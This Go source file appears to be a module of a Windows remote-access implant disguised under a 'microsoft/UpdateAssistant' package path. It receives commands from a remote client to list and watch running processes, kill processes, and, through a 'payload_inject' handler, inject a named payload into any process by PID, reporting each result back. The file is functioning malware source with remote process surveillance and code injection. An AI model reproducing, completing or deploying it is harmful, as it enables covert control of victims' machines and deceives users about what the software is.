//go:build windows

package procs

import (
	"encoding/json"
	"sync"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

var (
	watchStop chan struct{}
	watchOnce sync.Once
)

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "procwatch_start":
		watchOnce.Do(func() {
			watchStop = make(chan struct{})
			go func() {
				client.Send("task_update", map[string]interface{}{"procs": sysutil.ListProcs()})
				watch(client, watchStop)
			}()
		})
	case "procwatch_stop":
		if watchStop != nil {
			close(watchStop)
			watchStop = nil
			watchOnce = sync.Once{}
		}
	case "proclist_get":
		go func() {
			client.Send("proclist_result", map[string]interface{}{"procs": sysutil.ListProcs()})
		}()
	case "proc_kill":
		var m struct {
			PID uint32 `json:"pid"`
		}
		if json.Unmarshal(payload, &m) != nil || m.PID == 0 {
			return
		}
		go func(pid uint32) {
			client.Send("proc_kill_result", map[string]interface{}{"pid": pid, "ok": sysutil.KillProc(pid)})
		}(m.PID)
	case "payload_inject":
		var m struct {
			PID  uint32 `json:"pid"`
			Name string `json:"name"`
		}
		if json.Unmarshal(payload, &m) != nil || m.PID == 0 || m.Name == "" {
			return
		}
		go func(pid uint32, name string) {
			err := loader.Inject(pid, name)
			result := map[string]interface{}{
				"pid":  pid,
				"name": name,
				"ok":   err == nil,
			}
			if err != nil {
				result["detail"] = err.Error()
			}
			client.Send("payload_inject_result", result)
		}(m.PID, m.Name)
	}
}

func watch(client *transport.Client, stop chan struct{}) {
	var last string
	for {
		select {
		case <-stop:
			return
		case <-time.After(2 * time.Second):
			cur := sysutil.ListProcs()
			if cur != last {
				last = cur
				client.Send("task_update", map[string]interface{}{"procs": cur})
			}
		}
	}
}
